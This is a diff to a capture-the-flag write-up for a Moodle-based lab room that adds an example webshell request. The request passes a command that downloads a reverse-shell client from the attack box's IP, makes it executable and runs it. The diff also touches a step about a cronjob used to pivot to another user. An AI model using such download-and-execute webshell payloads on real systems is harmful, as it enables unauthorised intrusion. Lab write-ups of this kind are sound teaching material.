@@ -36,8 +36,13 @@ A fairly hard room, largely due to the breadth of the enumeration and its numero
 
     ```
     
-8. with the new webshell we can get a strong reverse shell. I used `https://github.com/NHAS/reverse_ssh` to get a full shell as www-data.
-9. To pivot to the `plot_admin` user, there is a cronjob that runs every minute, executing a script called backup.py in the plot_admin user's home directory. The contents of this script are:
+8. with the new webshell we can get a strong reverse shell. I used `https://github.com/NHAS/reverse_ssh` to get a full shell as www-data. E.g., via the following path (with the ip of my attack box and webserver port in there:
+
+    ```
+    GET /moodle/blocks/rce/lang/en/block_rce.php?cmd=wget+10.10.132.8%3a1234/client+%26%26+chmod+%2bx+client+%26%26+./client+%26 HTTP/1.1
+    ```
+
+10. To pivot to the `plot_admin` user, there is a cronjob that runs every minute, executing a script called backup.py in the plot_admin user's home directory. The contents of this script are:
 
     ```python
     import os
